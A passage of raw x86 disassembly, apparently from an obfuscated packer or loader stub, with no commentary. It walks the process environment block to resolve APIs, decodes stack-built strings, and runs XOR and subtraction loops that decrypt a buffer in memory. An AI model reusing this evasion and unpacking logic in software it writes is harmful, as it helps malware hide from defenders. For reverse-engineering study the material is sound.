  41d688:	mov    DWORD PTR [ebp-0x34],0x4d
  41d68f:	mov    DWORD PTR [ebp-0x34],0x43
  41d696:	mov    ecx,DWORD PTR [ebp-0x14]
  41d699:	xor    ecx,ebx
  41d69b:	add    ecx,eax
  41d69d:	mov    DWORD PTR [ebp-0x34],ecx
  41d6a0:	mov    ecx,DWORD PTR [ebp-0x14]
  41d6a3:	xor    ecx,ebx
  41d6a5:	add    ecx,eax
  41d6a7:	mov    DWORD PTR [ebp-0x34],ecx
  41d6aa:	mov    DWORD PTR [ebp-0x28],0x257
  41d6b1:	mov    DWORD PTR [ebp-0x20],0x35
  41d6b8:	mov    DWORD PTR [ebp-0x10],0x79
  41d6bf:	lea    edi,[ebp-0xe4]
  41d6c5:	lea    esi,[ebp-0x104]
  41d6cb:	call   0x41e2e7
  41d6d0:	dec    DWORD PTR [ebp-0x10]
  41d6d3:	jne    0x41d6bf
  41d6d5:	dec    DWORD PTR [ebp-0x20]
  41d6d8:	jne    0x41d6b8
  41d6da:	dec    DWORD PTR [ebp-0x28]
  41d6dd:	jne    0x41d6b1
  41d6df:	mov    DWORD PTR [ebp-0x28],0x400d
  41d6e6:	mov    eax,DWORD PTR [ebp-0x14]
  41d6e9:	xor    eax,ebx
  41d6eb:	mov    esi,0x3272e2
  41d6f0:	add    eax,esi
  41d6f2:	mov    DWORD PTR [ebp-0x8],eax
  41d6f5:	mov    eax,DWORD PTR [ebp-0x14]
  41d6f8:	and    DWORD PTR [ebp-0x94],0x0
  41d6ff:	xor    eax,ebx
  41d701:	add    eax,esi
  41d703:	mov    DWORD PTR [ebp-0x38],eax
  41d706:	mov    eax,fs:0x18
  41d70c:	mov    DWORD PTR [ebp-0x94],eax
  41d712:	mov    eax,DWORD PTR [eax+0x30]
  41d715:	mov    DWORD PTR [ebp-0x98],eax
  41d71b:	mov    eax,DWORD PTR [eax+0xc]
  41d71e:	mov    DWORD PTR [ebp-0xc0],eax
  41d724:	mov    eax,DWORD PTR [ebp+0x8]
  41d727:	lea    ecx,[ebp-0x94]
  41d72d:	mov    DWORD PTR [eax+0x1a0],ecx
  41d733:	mov    eax,DWORD PTR [ebp+0x8]
  41d736:	lea    ecx,[ebp-0x98]
  41d73c:	mov    DWORD PTR [eax+0x1a4],ecx
  41d742:	mov    eax,DWORD PTR [ebp+0x8]
  41d745:	push   DWORD PTR [ebp+0x8]
  41d748:	lea    ecx,[ebp-0xc0]
  41d74e:	mov    DWORD PTR [eax+0x1a8],ecx
  41d754:	call   0x41facd
  41d759:	mov    ecx,DWORD PTR [ebp-0x14]
  41d75c:	xor    ecx,ebx
  41d75e:	add    ecx,esi
  41d760:	cmp    ecx,eax
  41d762:	je     0x41da3f
  41d768:	mov    eax,DWORD PTR [ebp+0x8]
  41d76b:	mov    eax,DWORD PTR [eax+0x194]
  41d771:	mov    ecx,DWORD PTR [eax]
  41d773:	mov    eax,DWORD PTR [ebp+0x8]
  41d776:	mov    eax,DWORD PTR [eax+0x194]
  41d77c:	mov    eax,DWORD PTR [eax]
  41d77e:	add    eax,DWORD PTR [ecx+0x3c]
  41d781:	mov    ecx,DWORD PTR [ebp+0x8]
  41d784:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41d78a:	lea    edx,[ebp-0xc4]
  41d790:	push   edx
  41d791:	mov    edx,DWORD PTR [ebp+0x8]
  41d794:	mov    edx,DWORD PTR [edx+0x18c]
  41d79a:	mov    edx,DWORD PTR [edx]
  41d79c:	add    edx,DWORD PTR [eax+0x88]
  41d7a2:	push   0x4
  41d7a4:	push   DWORD PTR [eax+0x8c]
  41d7aa:	push   edx
  41d7ab:	call   DWORD PTR [ecx+0x1c]
  41d7ae:	push   DWORD PTR [ebp+0x8]
  41d7b1:	mov    edi,DWORD PTR [ebp+0x8]
  41d7b4:	mov    eax,DWORD PTR [ebp+0x8]
  41d7b7:	mov    edx,DWORD PTR [eax+0x1b8]
  41d7bd:	mov    DWORD PTR [ebp-0x68],0xe080f00
  41d7c4:	mov    DWORD PTR [ebp-0x64],0x50c011f
  41d7cb:	mov    WORD PTR [ebp-0x60],0x7c3d
  41d7d1:	mov    DWORD PTR [ebp-0x90],0x43f0f25
  41d7db:	mov    DWORD PTR [ebp-0x8c],0x3d0e1d
  41d7e5:	mov    DWORD PTR [ebp-0x88],0x221d040c
  41d7ef:	mov    DWORD PTR [ebp-0x84],0xe190109
  41d7f9:	mov    DWORD PTR [ebp-0x80],0x7c3d1f05
  41d800:	mov    DWORD PTR [ebp-0x7c],0x43f0f25
  41d807:	mov    DWORD PTR [ebp-0x78],0x3d0e1d
  41d80e:	mov    DWORD PTR [ebp-0x74],0x221d040c
  41d815:	mov    DWORD PTR [ebp-0x70],0xe190109
  41d81c:	mov    DWORD PTR [ebp-0x6c],0x7c2b1f05
  41d823:	call   0x41fafc
  41d828:	push   eax
  41d829:	mov    eax,DWORD PTR [ebp+0x8]
  41d82c:	mov    eax,DWORD PTR [eax+0x1a8]
  41d832:	push   DWORD PTR [eax]
  41d834:	call   0x41f79d
  41d839:	test   eax,eax
  41d83b:	jne    0x41d88d
  41d83d:	mov    eax,DWORD PTR [ebp+0x8]
  41d840:	mov    eax,DWORD PTR [eax+0x1d8]
  41d846:	mov    edi,DWORD PTR [ebp+0x8]
  41d849:	add    eax,0x4
  41d84c:	mov    DWORD PTR [ebp-0x24],eax
  41d84f:	mov    eax,DWORD PTR [ebp+0x8]
  41d852:	mov    edx,DWORD PTR [eax+0x1b8]
  41d858:	call   0x41fafc
  41d85d:	push   eax
  41d85e:	mov    eax,DWORD PTR [ebp-0x24]
  41d861:	call   DWORD PTR [eax]
  41d863:	test   eax,eax
  41d865:	jne    0x41d88d
  41d867:	mov    eax,DWORD PTR [ebp+0x8]
  41d86a:	mov    eax,DWORD PTR [eax+0x1d8]
  41d870:	mov    edi,DWORD PTR [ebp+0x8]
  41d873:	add    eax,0x10
  41d876:	mov    DWORD PTR [ebp-0x24],eax
  41d879:	mov    eax,DWORD PTR [ebp+0x8]
  41d87c:	mov    edx,DWORD PTR [eax+0x1b8]
  41d882:	call   0x41fafc
  41d887:	push   eax
  41d888:	mov    eax,DWORD PTR [ebp-0x24]
  41d88b:	call   DWORD PTR [eax]
  41d88d:	mov    eax,DWORD PTR [ebp-0x14]
  41d890:	mov    ecx,DWORD PTR [ebp-0x28]
  41d893:	xor    eax,ebx
  41d895:	add    eax,esi
  41d897:	cmp    eax,ecx
  41d899:	je     0x41da18
  41d89f:	mov    eax,DWORD PTR [ebp-0x18]
  41d8a2:	xor    eax,ebx
  41d8a4:	mov    ecx,0xffcd8d1e
  41d8a9:	sub    ecx,eax
  41d8ab:	add    ecx,DWORD PTR [ebp-0x28]
  41d8ae:	mov    eax,DWORD PTR [ebp-0x8]
  41d8b1:	cmp    eax,ecx
  41d8b3:	ja     0x41da18
  41d8b9:	mov    DWORD PTR [ebp-0x20],0x0
  41d8c0:	push   DWORD PTR [ebp+0x8]
  41d8c3:	mov    edi,DWORD PTR [ebp+0x8]
  41d8c6:	mov    eax,DWORD PTR [ebp+0x8]
  41d8c9:	mov    edx,DWORD PTR [eax+0x1b4]
  41d8cf:	call   0x41fafc
  41d8d4:	push   eax
  41d8d5:	mov    eax,DWORD PTR [ebp+0x8]
  41d8d8:	mov    eax,DWORD PTR [eax+0x1a8]
  41d8de:	push   DWORD PTR [eax]
  41d8e0:	call   0x41f79d
  41d8e5:	mov    ecx,DWORD PTR [ebp+0x8]
  41d8e8:	mov    ecx,DWORD PTR [ecx+0x19c]
  41d8ee:	mov    DWORD PTR [ecx],eax
  41d8f0:	mov    eax,DWORD PTR [ebp+0x8]
  41d8f3:	mov    edi,DWORD PTR [eax+0x1d8]
  41d8f9:	mov    esi,DWORD PTR [ebp+0x8]
  41d8fc:	xor    eax,eax
  41d8fe:	lea    edx,[ebp-0x7c]
  41d901:	call   0x41fb32
  41d906:	push   eax
  41d907:	mov    eax,DWORD PTR [ebp+0x8]
  41d90a:	mov    eax,DWORD PTR [eax+0x19c]
  41d910:	push   DWORD PTR [eax]
  41d912:	call   DWORD PTR [edi+0x8]
  41d915:	mov    DWORD PTR [ebp-0x24],eax
  41d918:	mov    eax,DWORD PTR [ebp+0x8]
  41d91b:	mov    edi,DWORD PTR [eax+0x1d8]
  41d921:	mov    esi,DWORD PTR [ebp+0x8]
  41d924:	xor    eax,eax
  41d926:	lea    edx,[ebp-0x90]
  41d92c:	call   0x41fb32
  41d931:	push   eax
  41d932:	mov    eax,DWORD PTR [ebp+0x8]
  41d935:	mov    eax,DWORD PTR [eax+0x19c]
  41d93b:	push   DWORD PTR [eax]
  41d93d:	call   DWORD PTR [edi+0x8]
  41d940:	and    DWORD PTR [ebp-0x1c],0x0
  41d944:	mov    eax,DWORD PTR [ebp-0x1c]
  41d947:	and    eax,0x7
  41d94a:	add    eax,0x31
  41d94d:	push   eax
  41d94e:	call   DWORD PTR [ebp-0x24]
  41d951:	test   eax,eax
  41d953:	jne    0x41d95a
  41d955:	and    DWORD PTR [ebp-0x10],eax
  41d958:	jmp    0x41d982
  41d95a:	mov    eax,DWORD PTR [ebp+0x8]
  41d95d:	mov    edi,DWORD PTR [eax+0x1d8]
  41d963:	mov    esi,DWORD PTR [ebp+0x8]
  41d966:	xor    eax,eax
  41d968:	lea    edx,[ebp-0x68]
  41d96b:	call   0x41fb32
  41d970:	push   eax
  41d971:	mov    eax,DWORD PTR [ebp+0x8]
  41d974:	mov    eax,DWORD PTR [eax+0x198]
  41d97a:	push   DWORD PTR [eax]
  41d97c:	call   DWORD PTR [edi+0x8]
  41d97f:	mov    DWORD PTR [ebp-0x10],eax
  41d982:	inc    DWORD PTR [ebp-0x1c]
  41d985:	cmp    DWORD PTR [ebp-0x1c],0x10
  41d989:	jb     0x41d944
  41d98b:	mov    eax,DWORD PTR [ebp-0x18]
  41d98e:	mov    esi,DWORD PTR [ebp+0x8]
  41d991:	xor    eax,ebx
  41d993:	mov    edi,0x3272e2
  41d998:	add    eax,edi
  41d99a:	lea    edx,[ebp-0xe4]
  41d9a0:	call   0x41fb32
  41d9a5:	push   eax
  41d9a6:	mov    eax,DWORD PTR [ebp-0x14]
  41d9a9:	mov    esi,DWORD PTR [ebp+0x8]
  41d9ac:	xor    eax,ebx
  41d9ae:	add    eax,edi
  41d9b0:	lea    edx,[ebp-0x104]
  41d9b6:	call   0x41fb32
  41d9bb:	push   eax
  41d9bc:	call   DWORD PTR [ebp-0x10]
  41d9bf:	mov    ecx,DWORD PTR [ebp-0x14]
  41d9c2:	xor    ecx,ebx
  41d9c4:	add    ecx,edi
  41d9c6:	cmp    ecx,eax
  41d9c8:	jne    0x41d9d1
  41d9ca:	mov    DWORD PTR [ebp-0x20],0x1
  41d9d1:	mov    eax,DWORD PTR [ebp-0x18]
  41d9d4:	mov    ecx,DWORD PTR [ebp-0x8]
  41d9d7:	xor    eax,ebx
  41d9d9:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9e0:	mov    DWORD PTR [ebp-0x8],eax
  41d9e3:	mov    eax,DWORD PTR [ebp-0x20]
  41d9e6:	test   eax,eax
  41d9e8:	je     0x41d9fc
  41d9ea:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ed:	mov    ecx,DWORD PTR [ebp-0x38]
  41d9f0:	xor    eax,ebx
  41d9f2:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9f9:	mov    DWORD PTR [ebp-0x38],eax
  41d9fc:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ff:	xor    eax,ebx
  41da01:	mov    ecx,0xffcd8d1e
  41da06:	sub    ecx,eax
  41da08:	add    ecx,DWORD PTR [ebp-0x28]
  41da0b:	mov    eax,DWORD PTR [ebp-0x8]
  41da0e:	cmp    eax,ecx
  41da10:	jbe    0x41d8b9
  41da16:	mov    esi,edi
  41da18:	mov    eax,DWORD PTR [ebp-0x38]
  41da1b:	mov    ecx,DWORD PTR [ebp-0x8]
  41da1e:	cmp    ecx,eax
  41da20:	jne    0x41da33
  41da22:	push   DWORD PTR [ebp+0x8]
  41da25:	lea    eax,[ebp-0x3c]
  41da28:	push   eax
  41da29:	call   0x4205aa
  41da2e:	mov    DWORD PTR [ebp-0x2c],eax
  41da31:	jmp    0x41da3f
  41da33:	mov    eax,DWORD PTR [ebp-0x2c]
  41da36:	mov    ecx,DWORD PTR [ebp-0x18]
  41da39:	xor    ecx,ebx
  41da3b:	add    ecx,esi
  41da3d:	xor    DWORD PTR [eax],ecx
  41da3f:	mov    eax,DWORD PTR [ebp-0x14]
  41da42:	mov    ecx,DWORD PTR [ebp-0x2c]
  41da45:	xor    eax,ebx
  41da47:	add    eax,esi
  41da49:	cmp    eax,ecx
  41da4b:	je     0x41e1c5
  41da51:	mov    eax,DWORD PTR [ebp-0x14]
  41da54:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da57:	xor    eax,ebx
  41da59:	add    eax,esi
  41da5b:	cmp    eax,ecx
  41da5d:	je     0x41e1c5
  41da63:	mov    eax,DWORD PTR [ebp-0x14]
  41da66:	xor    eax,ebx
  41da68:	add    eax,esi
  41da6a:	jmp    0x41da88
  41da6c:	mov    edi,DWORD PTR [ebp-0x2c]
  41da6f:	mov    cl,al
  41da71:	and    cl,0x1f
  41da74:	or     dl,0xff
  41da77:	sub    dl,cl
  41da79:	add    BYTE PTR [edi+eax*1],dl
  41da7c:	mov    ecx,DWORD PTR [ebp-0x18]
  41da7f:	xor    ecx,ebx
  41da81:	lea    eax,[eax+ecx*1+0x3272e2]
  41da88:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da8b:	cmp    eax,ecx
  41da8d:	jb     0x41da6c
  41da8f:	mov    eax,DWORD PTR [ebp-0x3c]
  41da92:	mov    DWORD PTR [ebp-0x28],eax
  41da95:	mov    eax,DWORD PTR [ebp-0x2c]
  41da98:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41da9f:	mov    DWORD PTR [ebp-0xbc],eax
  41daa5:	mov    edi,0xf89c8584
  41daaa:	mov    DWORD PTR [ebp-0x30],edi
  41daad:	mov    eax,DWORD PTR [ebp-0x38]
  41dab0:	xor    eax,ebx
  41dab2:	add    eax,esi
  41dab4:	mov    DWORD PTR [ebp-0xc],eax
  41dab7:	mov    eax,DWORD PTR [ebp-0x38]
  41daba:	xor    eax,ebx
  41dabc:	add    eax,esi
  41dabe:	mov    DWORD PTR [ebp-0x8],eax
  41dac1:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41dac8:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  41dacf:	mov    eax,DWORD PTR [ebp-0x38]
  41dad2:	mov    ecx,DWORD PTR [ebp-0x28]
  41dad5:	xor    eax,ebx
  41dad7:	add    eax,esi
  41dad9:	cmp    ecx,eax
  41dadb:	je     0x41dcda
  41dae1:	jmp    0x41dcb6
  41dae6:	mov    ecx,DWORD PTR [ebp-0xc]
  41dae9:	mov    eax,DWORD PTR [ebp-0x28]
  41daec:	sub    eax,ecx
  41daee:	mov    ecx,DWORD PTR [ebp-0x48]
  41daf1:	xor    ecx,ebx
  41daf3:	add    ecx,esi
  41daf5:	xor    edx,edx
  41daf7:	div    ecx
  41daf9:	mov    DWORD PTR [ebp-0x8],eax
  41dafc:	mov    eax,DWORD PTR [ebp-0x54]
  41daff:	mov    ecx,DWORD PTR [ebp-0x8]
  41db02:	xor    eax,ebx
  41db04:	add    eax,esi
  41db06:	cmp    ecx,eax
  41db08:	jbe    0x41db14
  41db0a:	mov    eax,DWORD PTR [ebp-0x54]
  41db0d:	xor    eax,ebx
  41db0f:	add    eax,esi
  41db11:	mov    DWORD PTR [ebp-0x8],eax
  41db14:	mov    eax,DWORD PTR [ebp-0x48]
  41db17:	mov    ecx,DWORD PTR [ebp-0x8]
  41db1a:	xor    eax,ebx
  41db1c:	add    eax,esi
  41db1e:	imul   eax,ecx
  41db21:	mov    DWORD PTR [ebp-0x8],eax
  41db24:	mov    eax,DWORD PTR [ebp-0x38]
  41db27:	mov    ecx,DWORD PTR [ebp-0x8]
  41db2a:	xor    eax,ebx
  41db2c:	add    eax,esi
  41db2e:	cmp    ecx,eax
  41db30:	je     0x41dca4
  41db36:	mov    eax,DWORD PTR [ebp-0x8]
  41db39:	mov    DWORD PTR [ebp-0x10],eax
  41db3c:	mov    eax,DWORD PTR [ebp-0xc]
  41db3f:	add    eax,DWORD PTR [ebp-0xbc]
  41db45:	mov    DWORD PTR [ebp-0x24],0xf89c8585
  41db4c:	mov    DWORD PTR [ebp-0x20],edi
  41db4f:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  41db59:	mov    DWORD PTR [ebp-0x8],eax
  41db5c:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41db63:	mov    DWORD PTR [ebp-0x1c],edi
  41db66:	mov    eax,DWORD PTR [ebp-0x24]
  41db69:	xor    eax,ebx
  41db6b:	add    eax,esi
  41db6d:	jmp    0x41dc63
  41db72:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  41db7c:	mov    DWORD PTR [ebp-0xb8],0xf89c85a9
  41db86:	mov    eax,DWORD PTR [ebp-0x1c]
  41db89:	mov    ecx,DWORD PTR [ebp-0x44]
  41db8c:	xor    eax,ebx
  41db8e:	add    eax,esi
  41db90:	imul   eax,ecx
  41db93:	mov    ecx,DWORD PTR [ebp-0x8]
  41db96:	mov    al,BYTE PTR [eax+ecx*1]
  41db99:	mov    BYTE PTR [ebp-0x2],al
  41db9c:	mov    eax,DWORD PTR [ebp-0x1c]
  41db9f:	mov    ecx,DWORD PTR [ebp-0x44]
  41dba2:	xor    eax,ebx
  41dba4:	add    eax,esi
  41dba6:	imul   eax,ecx
  41dba9:	mov    ecx,DWORD PTR [ebp-0xa8]
  41dbaf:	xor    ecx,ebx
  41dbb1:	add    eax,ecx
  41dbb3:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbb6:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dbbe:	mov    ecx,DWORD PTR [ebp-0xb0]
  41dbc4:	xor    ecx,ebx
  41dbc6:	lea    eax,[ecx+eax*1+0x3272e2]
  41dbcd:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dbd1:	xor    ecx,eax
  41dbd3:	mov    BYTE PTR [ebp-0x2],cl
  41dbd6:	mov    al,BYTE PTR [ebp-0x2]
  41dbd9:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dbdc:	mov    edx,DWORD PTR [ebp-0x44]
  41dbdf:	xor    ecx,ebx
  41dbe1:	add    ecx,esi
  41dbe3:	imul   ecx,edx
  41dbe6:	mov    edx,DWORD PTR [ebp-0x8]
  41dbe9:	mov    BYTE PTR [ecx+edx*1],al
  41dbec:	mov    eax,DWORD PTR [ebp-0x1c]
  41dbef:	mov    ecx,DWORD PTR [ebp-0x44]
  41dbf2:	xor    eax,ebx
  41dbf4:	add    eax,esi
  41dbf6:	imul   eax,ecx
  41dbf9:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbfc:	mov    al,BYTE PTR [eax+ecx*1]
  41dbff:	mov    BYTE PTR [ebp-0x2],al
  41dc02:	mov    eax,DWORD PTR [ebp-0x1c]
  41dc05:	mov    ecx,DWORD PTR [ebp-0x44]
  41dc08:	xor    eax,ebx
  41dc0a:	add    eax,esi
  41dc0c:	imul   eax,ecx
  41dc0f:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc12:	xor    ecx,ebx
  41dc14:	add    eax,ecx
  41dc16:	mov    ecx,DWORD PTR [ebp-0x8]
  41dc19:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dc21:	mov    ecx,DWORD PTR [ebp-0xb8]
  41dc27:	xor    ecx,ebx
  41dc29:	lea    eax,[ecx+eax*1+0x3272e2]
  41dc30:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dc34:	xor    ecx,eax
  41dc36:	mov    BYTE PTR [ebp-0x2],cl
  41dc39:	mov    al,BYTE PTR [ebp-0x2]
  41dc3c:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dc3f:	mov    edx,DWORD PTR [ebp-0x44]
  41dc42:	xor    ecx,ebx
  41dc44:	add    ecx,esi
  41dc46:	imul   ecx,edx
  41dc49:	mov    edx,DWORD PTR [ebp-0x8]
  41dc4c:	mov    BYTE PTR [ecx+edx*1],al
  41dc4f:	mov    eax,DWORD PTR [ebp-0x34]
  41dc52:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc55:	xor    eax,ebx
  41dc57:	xor    ecx,ebx
  41dc59:	add    eax,esi
  41dc5b:	add    ecx,esi
  41dc5d:	imul   eax,ecx
  41dc60:	add    eax,DWORD PTR [ebp-0x44]
  41dc63:	mov    DWORD PTR [ebp-0x44],eax
  41dc66:	mov    eax,DWORD PTR [ebp-0x44]
  41dc69:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc6c:	cmp    ecx,eax
  41dc6e:	jb     0x41db72
  41dc74:	mov    eax,DWORD PTR [ebp-0x20]
  41dc77:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc7a:	xor    eax,ebx
  41dc7c:	add    eax,esi
  41dc7e:	imul   eax,ecx
  41dc81:	mov    ecx,DWORD PTR [ebp-0x24]
  41dc84:	xor    ecx,ebx
  41dc86:	add    ecx,esi
  41dc88:	or     eax,ecx
  41dc8a:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc8d:	xor    ecx,ebx
  41dc8f:	add    eax,ecx
  41dc91:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc94:	xor    ecx,ebx
  41dc96:	add    eax,ecx
  41dc98:	mov    ecx,DWORD PTR [ebp-0xc]
  41dc9b:	lea    eax,[eax+ecx*1+0x64e5c4]
  41dca2:	jmp    0x41dcb3
  41dca4:	mov    eax,DWORD PTR [ebp-0x30]
  41dca7:	mov    ecx,DWORD PTR [ebp-0xc]
  41dcaa:	xor    eax,ebx
  41dcac:	lea    eax,[eax+ecx*1+0x3272e2]
  41dcb3:	mov    DWORD PTR [ebp-0xc],eax
  41dcb6:	mov    eax,DWORD PTR [ebp-0x30]
  41dcb9:	xor    eax,ebx
  41dcbb:	mov    ecx,0xffcd8d1e
  41dcc0:	sub    ecx,eax
  41dcc2:	add    ecx,DWORD PTR [ebp-0x28]
  41dcc5:	mov    eax,DWORD PTR [ebp-0x30]
  41dcc8:	mov    edx,DWORD PTR [ebp-0xc]
  41dccb:	xor    eax,ebx
  41dccd:	add    eax,esi
  41dccf:	imul   eax,edx
  41dcd2:	cmp    eax,ecx
  41dcd4:	jbe    0x41dae6
  41dcda:	mov    eax,DWORD PTR [ebp-0x14]
  41dcdd:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dce0:	mov    eax,DWORD PTR [ebp+0x8]
  41dce3:	mov    edx,DWORD PTR [ebp-0x4c]
  41dce6:	mov    eax,DWORD PTR [eax+0x1d8]
  41dcec:	xor    edx,ebx
  41dcee:	add    edx,esi
  41dcf0:	push   edx
  41dcf1:	mov    edx,DWORD PTR [ebp-0x40]
  41dcf4:	xor    edx,ebx
  41dcf6:	add    edx,esi
  41dcf8:	push   edx
  41dcf9:	push   ecx
  41dcfa:	mov    DWORD PTR [ebp-0x34],ecx
  41dcfd:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd00:	xor    ecx,ebx
  41dd02:	add    ecx,esi
  41dd04:	push   ecx
  41dd05:	call   DWORD PTR [eax+0x14]
  41dd08:	mov    edi,eax
  41dd0a:	mov    eax,DWORD PTR [ebp-0x14]
  41dd0d:	xor    eax,ebx
  41dd0f:	add    eax,esi
  41dd11:	cmp    eax,edi
  41dd13:	je     0x41dd6e
  41dd15:	mov    eax,DWORD PTR [ebp-0x14]
  41dd18:	jmp    0x41dd3b
  41dd1a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41dd1d:	xor    eax,ebx
  41dd1f:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  41dd26:	mov    BYTE PTR [eax+edi*1+0x3272e2],cl
  41dd2d:	mov    ecx,DWORD PTR [ebp-0x18]
  41dd30:	xor    ecx,ebx
  41dd32:	lea    eax,[ecx+eax*1+0x3272e2]
  41dd39:	xor    eax,ebx
  41dd3b:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dd3e:	sub    ecx,esi
  41dd40:	xor    ecx,ebx
  41dd42:	cmp    eax,ecx
  41dd44:	jne    0x41dd1a
  41dd46:	mov    eax,DWORD PTR [ebp+0x8]
  41dd49:	mov    ecx,DWORD PTR [ebp-0x50]
  41dd4c:	mov    eax,DWORD PTR [eax+0x1d8]
  41dd52:	xor    ecx,ebx
  41dd54:	add    ecx,esi
  41dd56:	push   ecx
  41dd57:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd5a:	xor    ecx,ebx
  41dd5c:	add    ecx,esi
  41dd5e:	push   ecx
  41dd5f:	push   DWORD PTR [ebp-0x2c]
  41dd62:	call   DWORD PTR [eax+0x18]
  41dd65:	mov    eax,DWORD PTR [ebp-0x34]
  41dd68:	mov    DWORD PTR [ebp-0x2c],edi
  41dd6b:	mov    DWORD PTR [ebp-0x3c],eax
  41dd6e:	mov    eax,DWORD PTR [ebp-0x2c]
  41dd71:	mov    DWORD PTR [ebp-0x10],eax
  41dd74:	mov    eax,DWORD PTR [ebp-0x18]
  41dd77:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd7a:	xor    eax,ebx
  41dd7c:	add    eax,esi
  41dd7e:	mov    DWORD PTR [ebp-0x5c],0x3d142c14
  41dd85:	mov    DWORD PTR [ebp-0x58],0x27143f14
  41dd8c:	jmp    0x41ddbf
  41dd8e:	mov    edx,DWORD PTR [ebp-0x10]
  41dd91:	mov    edi,ecx
  41dd93:	xor    edi,ebx
  41dd95:	mov    cl,BYTE PTR [ebp+edi*1+0x327286]
  41dd9c:	movsx  edx,BYTE PTR [edi+edx*1+0x3272e2]
  41dda4:	xor    cl,0x74
  41dda7:	sub    cl,0x8
  41ddaa:	movzx  ecx,cl
  41ddad:	cmp    edx,ecx
  41ddaf:	jne    0x41ddc9
  41ddb1:	mov    ecx,DWORD PTR [ebp-0x18]
  41ddb4:	xor    ecx,ebx
  41ddb6:	lea    ecx,[ecx+edi*1+0x3272e2]
  41ddbd:	xor    ecx,ebx
  41ddbf:	cmp    ecx,0xf89c85bd
  41ddc5:	jne    0x41dd8e
  41ddc7:	jmp    0x41ddd0
  41ddc9:	mov    eax,DWORD PTR [ebp-0x14]
  41ddcc:	xor    eax,ebx
  41ddce:	add    eax,esi
  41ddd0:	mov    ecx,DWORD PTR [ebp-0x14]
  41ddd3:	xor    ecx,ebx
  41ddd5:	add    ecx,esi
  41ddd7:	cmp    ecx,eax
  41ddd9:	je     0x41df4f
  41dddf:	mov    eax,DWORD PTR [ebp-0x10]
  41dde2:	mov    eax,DWORD PTR [eax+0x8]
  41dde5:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41ddec:	mov    DWORD PTR [ebp-0x40],0xf89cc316
  41ddf3:	mov    DWORD PTR [ebp-0x48],0xf89cb585
  41ddfa:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  41de01:	mov    DWORD PTR [ebp-0x20],eax
  41de04:	mov    eax,DWORD PTR [ebp+0x8]
  41de07:	mov    ecx,DWORD PTR [ebp-0x24]
  41de0a:	xor    ecx,ebx
  41de0c:	add    ecx,esi
  41de0e:	push   ecx
  41de0f:	mov    ecx,DWORD PTR [ebp-0x48]
  41de12:	mov    eax,DWORD PTR [eax+0x1d8]
  41de18:	xor    ecx,ebx
  41de1a:	add    ecx,esi
  41de1c:	push   ecx
  41de1d:	mov    ecx,DWORD PTR [ebp-0x40]
  41de20:	xor    ecx,ebx
  41de22:	add    ecx,esi
  41de24:	push   ecx
  41de25:	mov    ecx,DWORD PTR [ebp-0xc]
  41de28:	xor    ecx,ebx
  41de2a:	add    ecx,esi
  41de2c:	push   ecx
  41de2d:	call   DWORD PTR [eax+0x14]
  41de30:	mov    edi,eax
  41de32:	mov    eax,DWORD PTR [ebp+0x8]
  41de35:	mov    ecx,DWORD PTR [ebp-0x24]
  41de38:	mov    eax,DWORD PTR [eax+0x1d8]
  41de3e:	xor    ecx,ebx
  41de40:	add    ecx,esi
  41de42:	push   ecx
  41de43:	mov    ecx,DWORD PTR [ebp-0x48]
  41de46:	xor    ecx,ebx
  41de48:	add    ecx,esi
  41de4a:	push   ecx
  41de4b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de4e:	push   DWORD PTR [ebp-0x20]
  41de51:	xor    ecx,ebx
  41de53:	add    ecx,esi
  41de55:	push   ecx
  41de56:	call   DWORD PTR [eax+0x14]
  41de59:	mov    ecx,DWORD PTR [ebp-0xc]
  41de5c:	xor    ecx,ebx
  41de5e:	add    ecx,esi
  41de60:	mov    DWORD PTR [ebp-0x24],eax
  41de63:	cmp    ecx,edi
  41de65:	je     0x41e1f2
  41de6b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de6e:	xor    ecx,ebx
  41de70:	add    ecx,esi
  41de72:	cmp    ecx,eax
  41de74:	je     0x41e1f2
  41de7a:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  41de81:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41de88:	mov    ecx,DWORD PTR [ebp-0x40]
  41de8b:	xor    cl,0x9b
  41de8e:	sub    cl,0x1e
  41de91:	mov    BYTE PTR [edi],cl
  41de93:	mov    ecx,DWORD PTR [ebp-0xc]
  41de96:	xor    cl,0x9b
  41de99:	sub    cl,0x1e
  41de9c:	mov    BYTE PTR [edi+0x1],cl
  41de9f:	mov    ecx,DWORD PTR [ebp-0x4c]
  41dea2:	xor    cl,0x9b
  41dea5:	sub    cl,0x1e
  41dea8:	mov    BYTE PTR [edi+0x2],cl
